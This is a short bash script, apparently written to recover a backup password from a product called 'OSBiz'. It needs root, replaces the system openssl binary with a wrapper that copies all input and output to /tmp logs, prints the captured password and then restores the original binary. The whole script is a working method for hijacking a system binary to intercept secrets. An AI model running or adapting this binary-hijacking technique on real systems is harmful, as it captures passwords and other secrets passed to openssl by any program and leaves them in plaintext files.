#!/bin/bash
# **
# braam.vanhavermaet*bkm.be
# root privileges required.
# **

mv /usr/bin/openssl /usr/bin/openssl.orig
cat > /usr/bin/openssl <<- "EOF"
#!/bin/bash
cat - | tee /tmp/in.log | /usr/bin/openssl.orig $@ | tee /tmp/out.log
EOF
chmod +x /usr/bin/openssl

echo ">> openssl hijacked to intercept STDIN."

# TODO finding method to launch backup from this script..
read -p "Start backup through OSBiz, when it's complete [Enter] key to retrieve pass..."

echo "Intercepted pass: $(cat /tmp/in.log)"

echo ">> restoring openssl binary"
mv /usr/bin/openssl.orig /usr/bin/openssl
rm /tmp/in.log
rm /tmp/out.log
